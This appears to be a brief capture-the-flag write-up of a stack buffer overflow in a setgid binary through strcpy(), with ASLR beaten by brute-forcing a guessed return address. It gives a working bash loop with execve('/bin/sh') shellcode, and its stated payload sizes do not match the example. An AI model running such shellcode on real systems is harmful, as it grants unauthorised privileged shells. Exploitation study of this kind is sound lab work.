`vuln` has setgid bit. If we could find a way to change the flow of vuln, we can do it with owner group's rights.

strcpy() is vulnerable to bufferoverflow. As ASLR is enabled, our shellcode address change for each programm execution. One simple way to bypass this mitigation is to choose one address and to try this address again and again until we get lucky.

PAYLOAD : NOP*100 + SHELLCODE*25 + JUNK*143 + RET*4 (RET can change, we have to find it manually, using GDB for eg.)
Example : for i in {1..50000}; do echo Essai:$i && ./vuln `python -c "print '\x90'*1987 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x10\xd7\xba\xbf'"`;clear;done
